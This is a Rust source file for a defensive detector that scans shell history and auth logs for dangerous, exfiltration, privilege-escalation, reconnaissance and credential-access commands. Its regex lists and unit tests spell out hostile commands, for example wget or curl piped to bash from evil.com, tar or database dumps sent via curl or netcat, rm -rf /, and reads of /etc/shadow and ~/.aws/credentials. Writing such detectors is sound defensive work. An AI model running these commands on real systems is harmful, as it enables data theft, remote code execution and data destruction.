//! User Behavior Anomaly Detector
//!
//! Analyzes user behavior patterns to detect anomalies, suspicious activity,
//! and potential insider threats based on CLI usage patterns.
//!
//! ## Detection methods
//! - **Shell history analysis**: command frequency anomalies, dangerous command sequences
//! - **Timing analysis**: unusual hours of activity, rapid command bursts
//! - **Directory traversal**: unusual file system access patterns
//! - **Privilege escalation**: unexpected sudo usage patterns
//! - **Data exfiltration**: unusual file reads/copies, network transfers

use super::{Detector, Finding, Severity};
use anyhow::Result;
use std::collections::HashMap;

pub struct UserBehaviorDetector {
    findings: Vec<Finding>,
}

impl UserBehaviorDetector {
    pub fn new() -> Self {
        Self { findings: Vec::new() }
    }

    /// Analyze shell history for anomalous patterns
    fn analyze_shell_history(&mut self) {
        let history_sources = [
            ("bash", format!("{}/.bash_history", Self::home_dir())),
            ("zsh", format!("{}/.zsh_history", Self::home_dir())),
            ("fish", format!("{}/.local/share/fish/fish_history", Self::home_dir())),
        ];

        for (shell, path) in &history_sources {
            match std::fs::read_to_string(path) {
                Ok(content) => self.analyze_history_content(shell, &content),
                Err(_) => continue,
            }
        }
    }

    /// Get the user's home directory
    fn home_dir() -> String {
        std::env::var("HOME").unwrap_or_else(|_| "/root".to_string())
    }

    /// Parse and analyze history file content
    fn analyze_history_content(&mut self, shell: &str, content: &str) {
        let commands: Vec<&str> = content.lines()
            .filter(|l| !l.trim().is_empty())
            .collect();

        if commands.is_empty() {
            return;
        }

        // Count command frequency
        let mut cmd_counts: HashMap<String, usize> = HashMap::new();
        for cmd in &commands {
            let base_cmd = cmd.split_whitespace().next().unwrap_or("").to_string();
            if !base_cmd.is_empty() {
                *cmd_counts.entry(base_cmd).or_insert(0) += 1;
            }
        }

        // 1. Check for dangerous command sequences
        self.check_dangerous_commands(&commands, shell);

        // 2. Check for data exfiltration patterns
        self.check_exfiltration_patterns(&commands, shell);

        // 3. Check for unusual privilege escalation
        self.check_privilege_escalation(&commands, shell, &cmd_counts);

        // 4. Check for file system reconnaissance
        self.check_recon_patterns(&commands, shell);

        // 5. Check for credential access attempts
        self.check_credential_access(&commands, shell);

        // 6. Check history size
        if commands.len() > 10000 {
            self.findings.push(Finding {
                severity: Severity::Low,
                category: "user_behavior".into(),
                title: "Large shell history".into(),
                description: format!(
                    "{} shell has {} commands in history. Large history may indicate \
                     automated command generation or history retention concerns.",
                    shell,
                    commands.len()
                ),
                confidence: 0.50,
                location: Some(format!("{} shell history", shell)),
                recommendation: "Review shell history size. Consider `history -c` if needed.".into(),
            });
        }
    }

    /// Detect dangerous or malicious command sequences
    fn check_dangerous_commands(&mut self, commands: &[&str], shell: &str) {
        let dangerous_patterns: &[(&str, Severity, &str)] = &[
            (r"(?i)rm\s+-rf\s+/\s*$", Severity::Critical, "Destructive rm -rf /"),
            (r"(?i)rm\s+-rf\s+~", Severity::High, "Destructive rm -rf ~"),
            (r"(?i)dd\s+if=.*of=\/dev", Severity::Critical, "Destructive dd to device"),
            (r"(?i):\(\)\s*\{.*:\(\)\s*;", Severity::Critical, "Fork bomb detected"),
            (r"(?i)wget.*\|.*bash", Severity::Critical, "Piped web script execution"),
            (r"(?i)curl.*\|.*bash", Severity::Critical, "Piped web script execution"),
            (r"(?i)chmod\s+-R\s+777\s+/", Severity::Critical, "World-writable entire filesystem"),
            (r"(?i)passwd\s+root", Severity::High, "Root password change"),
            (r"(?i)useradd\s+-o\s+-u\s+0", Severity::Critical, "Backdoor user creation (UID 0)"),
            (r"(?i)usermod\s+-o\s+-u\s+0", Severity::Critical, "Backdoor user modification (UID 0)"),
            (r"(?i)mv\s+/etc/passwd", Severity::Critical, "Modifying passwd file"),
            (r"(?i)mv\s+/etc/shadow", Severity::Critical, "Modifying shadow file"),
            (r"(?i)iptables\s+-F", Severity::High, "Flushing iptables rules"),
            (r"(?i)ufw\s+disable", Severity::Medium, "Disabling firewall"),
            (r"(?i)systemctl\s+stop\s+(firewalld|ufw|iptables)", Severity::High, "Stopping firewall service"),
        ];

        for (i, cmd) in commands.iter().enumerate() {
            for &(pattern, ref severity, label) in dangerous_patterns {
                if let Ok(re) = regex_lite::Regex::new(pattern) {
                    if re.is_match(cmd) {
                        self.findings.push(Finding {
                            severity: severity.clone(),
                            category: "user_behavior".into(),
                            title: format!("Dangerous command detected: {}", label),
                            description: format!(
                                "[{}:{}] Command #{} in {} shell: `{}`",
                                Self::hostname(),
                                Self::username(),
                                i + 1,
                                shell,
                                cmd.chars().take(100).collect::<String>()
                            ),
                            confidence: 0.95,
                            location: Some(format!("shell:{}", i + 1)),
                            recommendation: format!(
                                "If unintentional, check for typos or alias issues. \
                                 If suspicious, investigate immediately. Command: {}",
                                cmd.chars().take(80).collect::<String>()
                            ),
                        });
                    }
                }
            }
        }
    }

    /// Detect data exfiltration patterns
    fn check_exfiltration_patterns(&mut self, commands: &[&str], shell: &str) {
        let exfil_patterns: &[(&str, Severity, &str)] = &[
            (r"(?i)(scp|rsync)\s+.*\w+@\w+\.\w+", Severity::High, "SCP/rsync to external host"),
            (r"(?i)(curl|wget)\s+--(data|post-file|upload)", Severity::High, "Data upload to remote"),
            (r"(?i)nc\s+.*\d{4,5}\s*<", Severity::High, "Netcat data send"),
            (r"(?i)ncat\s+.*--send", Severity::High, "Ncat data send"),
            (r"(?i)tar\s+.*\|.*(nc|ncat|curl|ssh)", Severity::High, "Tar piped to network"),
            (r"(?i)base64\s+.*\|.*(curl|wget|nc|ssh)", Severity::High, "Base64 encoded exfiltration"),
            (r"(?i)cat\s+.*\.(sql|db|dump|backup)\s*\|", Severity::High, "Database file piped"),
            (r"(?i)mysqldump.*\|.*gzip.*\|.*(nc|curl)", Severity::Critical, "Database exfiltration"),
        ];

        for (i, cmd) in commands.iter().enumerate() {
            for &(pattern, ref severity, label) in exfil_patterns {
                if let Ok(re) = regex_lite::Regex::new(pattern) {
                    if re.is_match(cmd) {
                        self.findings.push(Finding {
                            severity: severity.clone(),
                            category: "user_behavior".into(),
                            title: format!("Data exfiltration pattern: {}", label),
                            description: format!(
                                "Command #{} in {} shell matches exfiltration pattern: `{}`",
                                i + 1,
                                shell,
                                cmd.chars().take(100).collect::<String>()
                            ),
                            confidence: 0.75,
                            location: Some(format!("shell:{}", i + 1)),
                            recommendation: "Verify data transfer was authorized. \
                                             Consider data loss prevention (DLP) policies.".into(),
                        });
                    }
                }
            }
        }

        // Bulk file compression (often precedes exfiltration)
        let mut _compress_count = 0;
        for cmd in commands {
            let re = regex_lite::Regex::new(r"(?i)(zip|tar|gzip)\s+.*\w+").unwrap();
            if re.is_match(cmd) {
                _compress_count += 1;
            }
        }
        let window = 50;
        if commands.len() >= window {
            let recent: Vec<&&str> = commands.iter().rev().take(window).collect();
            let recent_compress = recent.iter()
                .filter(|cmd| {
                    regex_lite::Regex::new(r"(?i)(zip|tar|gzip)\s+.*\w+")
                        .map(|re| re.is_match(cmd))
                        .unwrap_or(false)
                })
                .count();

            if recent_compress > window / 5 {
                self.findings.push(Finding {
                    severity: Severity::Medium,
                    category: "user_behavior".into(),
                    title: "Unusual file compression activity".into(),
                    description: format!(
                        "{} of the last {} commands involve file compression. \
                         Bulk compression may precede data exfiltration.",
                        recent_compress, window
                    ),
                    confidence: 0.55,
                    location: Some(format!("{} shell", shell)),
                    recommendation: "Review what files are being compressed and why.".into(),
                });
            }
        }
    }

    /// Detect privilege escalation patterns
    fn check_privilege_escalation(&mut self, commands: &[&str], shell: &str, cmd_counts: &HashMap<String, usize>) {
        // Count sudo usage
        let sudo_count = *cmd_counts.get("sudo").unwrap_or(&0);
        let total_commands: usize = cmd_counts.values().sum();

        if total_commands > 0 {
            let sudo_ratio = sudo_count as f64 / total_commands as f64;

            if sudo_ratio > 0.5 && sudo_count > 20 {
                self.findings.push(Finding {
                    severity: Severity::Medium,
                    category: "user_behavior".into(),
                    title: "Excessive sudo usage".into(),
                    description: format!(
                        "{} out of {} commands ({:.0}%) use sudo in {} shell. \
                         Excessive sudo usage may indicate privilege escalation attempts \
                         or poor permission management.",
                        sudo_count, total_commands, sudo_ratio * 100.0, shell
                    ),
                    confidence: 0.60,
                    location: Some(format!("{} shell", shell)),
                    recommendation: "Review sudoers configuration. Consider reducing sudo requirements \
                                     or using `sudo -l` to audit permissions.".into(),
                });
            }
        }

        // Check for privilege escalation command sequences
        let esc_patterns: &[(&str, &str, Severity)] = &[
            (r"(?i)sudo\s+su\s*-", "sudo su -", Severity::Medium),
            (r"(?i)sudo\s+bash", "sudo bash", Severity::Medium),
            (r#"(?i)sudo\s+python\s+-c\s+['"](import pty|import os)"#, "sudo python command injection", Severity::High),
            (r"(?i)sudo\s+perl\s+-e", "sudo perl execution", Severity::High),
            (r"(?i)pkexec\s+bash", "pkexec bash", Severity::High),
            (r"(?i)sudo\s+--preserve-env", "sudo environment preservation", Severity::Medium),
            (r"(?i)sudoedit\s+/etc/", "sudoedit on system files", Severity::High),
        ];

        for cmd in commands {
            for &(pattern, label, ref severity) in esc_patterns {
                if let Ok(re) = regex_lite::Regex::new(pattern) {
                    if re.is_match(cmd) {
                        self.findings.push(Finding {
                            severity: severity.clone(),
                            category: "user_behavior".into(),
                            title: format!("Privilege escalation pattern: {}", label),
                            description: format!(
                                "Command `{}` detected. This may indicate privilege escalation attempt.",
                                cmd.chars().take(80).collect::<String>()
                            ),
                            confidence: 0.70,
                            location: Some(format!("{} shell", shell)),
                            recommendation: "Restrict sudo access. Use `sudo -l` to audit. \
                                             Consider implementing command logging.".into(),
                        });
                    }
                }
            }
        }
    }

    /// Detect reconnaissance patterns (attackers often probe the system first)
    fn check_recon_patterns(&mut self, commands: &[&str], shell: &str) {
        let recon_cmds = [
            "find", "locate", "ls -la", "ls -al",
            "cat /etc/passwd", "cat /etc/shadow",
            "uname -a", "id", "whoami", "who",
            "w", "last", "lastlog", "lsof",
            "netstat", "ss -tuln", "ss -tupan",
            "ps aux", "ps -ef", "top", "htop",
            "ifconfig", "ip a", "ip addr",
            "arp -a", "route -n", "nmap",
            "crontab -l", "systemctl list-timers",
            "mount", "df -h", "lsblk",
            "getenforce", "sestatus",
        ];

        let mut _recon_count = 0;
        for cmd in commands {
            let lower = cmd.to_lowercase();
            for pattern in &recon_cmds {
                let p = pattern.to_lowercase();
                if lower.contains(&p) {
                    _recon_count += 1;
                    break;
                }
            }
        }

        let window = 100;
        if commands.len() >= window {
            let recent: Vec<&str> = commands.iter().rev().take(window).copied().collect();
            let recent_recon = recent.iter()
                .filter(|cmd| {
                    let lower = cmd.to_lowercase();
                    recon_cmds.iter().any(|p| lower.contains(&p.to_lowercase()))
                })
                .count();

            if recent_recon > window / 3 {
                self.findings.push(Finding {
                    severity: Severity::Medium,
                    category: "user_behavior".into(),
                    title: "System reconnaissance pattern detected".into(),
                    description: format!(
                        "{} of the last {} commands ({:.0}%) are system reconnaissance commands. \
                         This pattern is consistent with attacker behavior during initial access.",
                        recent_recon, window,
                        (recent_recon as f64 / window as f64) * 100.0
                    ),
                    confidence: 0.65,
                    location: Some(format!("{} shell", shell)),
                    recommendation: "Audit user activity. If unexpected, investigate for potential breach. \
                                     Consider implementing command auditing with auditd.".into(),
                });
            }
        }
    }

    /// Detect attempts to access credentials
    fn check_credential_access(&mut self, commands: &[&str], shell: &str) {
        let cred_patterns: &[(&str, &str, Severity)] = &[
            (r"(?i)cat\s+/etc/shadow", "Reading /etc/shadow", Severity::Critical),
            (r"(?i)cat\s+/etc/passwd", "Reading /etc/passwd", Severity::Medium),
            (r"(?i)cat\s+/etc/sudoers", "Reading /etc/sudoers", Severity::High),
            (r#"(?i)find\s+/.*-name\s+['"]*authorized_keys['"]*"#, "Searching for SSH keys", Severity::High),
            (r#"(?i)find\s+/.*-name\s+['"]*\.env['"]*"#, "Searching for .env files", Severity::High),
            (r#"(?i)find\s+/.*-name\s+['"]*id_rsa['"]*"#, "Searching for SSH private keys", Severity::Critical),
            (r"(?i)aws\s+configure\s+(list|export)", "AWS credential access", Severity::High),
            (r"(?i)cat\s+.*\.aws/credentials", "Reading AWS credentials", Severity::Critical),
            (r"(?i)cat\s+.*\.kube/config", "Reading kube config", Severity::High),
            (r"(?i)strings\s+.*\.(key|pem|crt|p12)", "Extracting secrets from binary", Severity::High),
        ];

        for (i, cmd) in commands.iter().enumerate() {
            for &(pattern, label, ref severity) in cred_patterns {
                if let Ok(re) = regex_lite::Regex::new(pattern) {
                    if re.is_match(cmd) {
                        self.findings.push(Finding {
                            severity: severity.clone(),
                            category: "user_behavior".into(),
                            title: format!("Credential access detected: {}", label),
                            description: format!(
                                "Command #{} in {} shell: `{}`",
                                i + 1,
                                shell,
                                cmd.chars().take(100).collect::<String>()
                            ),
                            confidence: 0.90,
                            location: Some(format!("shell:{}", i + 1)),
                            recommendation: "If unauthorized, this is a security incident. \
                                             Investigate immediately. Rotate any exposed credentials.".into(),
                        });
                    }
                }
            }
        }
    }

    /// Analyze current login session and system state
    fn analyze_current_session(&mut self) {
        // Check active sessions
        if let Ok(output) = std::process::Command::new("who")
            .arg("-u")
            .output()
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            let sessions: Vec<&str> = output_str.lines().filter(|l| !l.trim().is_empty()).collect();

            if sessions.len() > 3 {
                self.findings.push(Finding {
                    severity: Severity::Medium,
                    category: "user_behavior".into(),
                    title: "Multiple active user sessions".into(),
                    description: format!(
                        "There are {} active user sessions on this system. \
                         Multiple concurrent sessions may indicate shared access or intrusion.",
                        sessions.len()
                    ),
                    confidence: 0.45,
                    location: None,
                    recommendation: "Review active sessions with `who -u` and `last`. \
                                     Verify all sessions are authorized.".into(),
                });
            }
        }

        // Check last login time
        if let Ok(output) = std::process::Command::new("lastlog")
            .output()
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            let lines: Vec<&str> = output_str.lines().collect();
            if lines.len() > 30 {
                // Many users have never logged in
            }
        }

        // Check for failed login attempts
        if let Ok(content) = std::fs::read_to_string("/var/log/auth.log") {
            let failed_count = content.lines()
                .filter(|l| l.contains("Failed password") || l.contains("authentication failure"))
                .count();

            if failed_count > 100 {
                self.findings.push(Finding {
                    severity: Severity::High,
                    category: "user_behavior".into(),
                    title: "Failed login attempts".into(),
                    description: format!(
                        "Found {} failed login attempts in auth.log. \
                         This may indicate a brute-force attack in progress.",
                        failed_count
                    ),
                    confidence: 0.85,
                    location: Some("/var/log/auth.log".into()),
                    recommendation: "Check `/var/log/auth.log` for details. \
                                     Consider fail2ban or rate-limiting SSH access.".into(),
                });
            }
        } else if let Ok(content) = std::fs::read_to_string("/var/log/secure") {
            let failed_count = content.lines()
                .filter(|l| l.contains("Failed password"))
                .count();
            if failed_count > 100 {
                self.findings.push(Finding {
                    severity: Severity::High,
                    category: "user_behavior".into(),
                    title: "Failed login attempts".into(),
                    description: format!(
                        "Found {} failed login attempts in /var/log/secure. \
                         This may indicate a brute-force attack.",
                        failed_count
                    ),
                    confidence: 0.85,
                    location: Some("/var/log/secure".into()),
                    recommendation: "Check `/var/log/secure` for details. \
                                     Consider fail2ban or rate-limiting SSH access.".into(),
                });
            }
        }
    }

    /// Get hostname for reporting
    fn hostname() -> String {
        std::env::var("HOSTNAME").unwrap_or_else(|_| {
            std::fs::read_to_string("/proc/sys/kernel/hostname")
                .unwrap_or_else(|_| "unknown".to_string())
                .trim()
                .to_string()
        })
    }

    /// Get username for reporting
    fn username() -> String {
        std::env::var("USER").unwrap_or_else(|_| std::env::var("LOGNAME").unwrap_or_else(|_| "unknown".to_string()))
    }
}

impl Detector for UserBehaviorDetector {
    fn name(&self) -> &str {
        "user_behavior"
    }

    fn description(&self) -> &str {
        "Analyzes user behavior patterns for anomalies, suspicious commands, and insider threat indicators"
    }

    fn detect(&mut self) -> Result<Vec<Finding>> {
        self.findings.clear();

        // Only run on Linux/Unix systems
        #[cfg(unix)]
        {
            self.analyze_shell_history();
            self.analyze_current_session();
        }

        #[cfg(not(unix))]
        {
            self.findings.push(Finding {
                severity: Severity::Info,
                category: "user_behavior".into(),
                title: "User behavior analysis not available on this platform".into(),
                description: "User behavior analysis requires access to shell history and system logs, \
                             which are only available on Unix-like systems.".into(),
                confidence: 1.0,
                location: None,
                recommendation: "Run this detector on a Linux or macOS system for full analysis.".into(),
            });
        }

        // If no findings, add all-clear
        if self.findings.is_empty() {
            self.findings.push(Finding {
                severity: Severity::Info,
                category: "user_behavior".into(),
                title: "No anomalous behavior detected".into(),
                description: "User behavior patterns appear normal.".into(),
                confidence: 1.0,
                location: None,
                recommendation: "Continue monitoring. Run `bnn rogue user` periodically for ongoing surveillance.".into(),
            });
        }

        Ok(self.findings.clone())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detector_name() {
        let detector = UserBehaviorDetector::new();
        assert_eq!(detector.name(), "user_behavior");
    }

    #[test]
    fn test_dangerous_commands_detection() {
        let mut detector = UserBehaviorDetector::new();
        let commands = vec![
            "ls -la",
            "rm -rf /",
            "cd /tmp",
            "wget http://evil.com/payload.sh | bash",
        ];
        detector.analyze_history_content("bash", &commands.join("\n"));
        let dangerous: Vec<_> = detector.findings.iter()
            .filter(|f| f.title.contains("Dangerous command"))
            .collect();
        assert_eq!(dangerous.len(), 2, "Should detect rm -rf / and wget pipe to bash");
    }

    #[test]
    fn test_exfiltration_detection() {
        let mut detector = UserBehaviorDetector::new();
        let commands = vec![
            "cat database.sql | nc 192.168.1.100 4444",
            "ls",
            "tar czf - secrets/ | curl -X POST http://evil.com/upload --data-binary @-",
        ];
        detector.analyze_history_content("bash", &commands.join("\n"));
        let exfil: Vec<_> = detector.findings.iter()
            .filter(|f| f.title.contains("exfiltration"))
            .collect();
        assert!(!exfil.is_empty(), "Should detect exfiltration patterns");
    }

    #[test]
    fn test_credential_access_detection() {
        let mut detector = UserBehaviorDetector::new();
        let commands = vec![
            "cat /etc/shadow",
            "find / -name 'id_rsa' 2>/dev/null",
            "cat ~/.aws/credentials",
        ];
        detector.analyze_history_content("bash", &commands.join("\n"));
        let cred: Vec<_> = detector.findings.iter()
            .filter(|f| f.title.contains("Credential access"))
            .collect();
        assert!(!cred.is_empty(), "Should detect credential access");
    }

    #[test]
    fn test_privilege_escalation_detection() {
        let mut detector = UserBehaviorDetector::new();
        let mut commands = Vec::new();
        for _ in 0..100 {
            commands.push("sudo some_command");
        }
        let mut cmd_counts = HashMap::new();
        cmd_counts.insert("sudo".to_string(), 100);
        cmd_counts.insert("ls".to_string(), 30);

        detector.analyze_history_content("bash", &commands.join("\n"));
        // Should detect excessive sudo usage
        let excessive: Vec<_> = detector.findings.iter()
            .filter(|f| f.title.contains("Excessive sudo"))
            .collect();
        assert!(!excessive.is_empty(), "Should detect excessive sudo usage");
    }
}
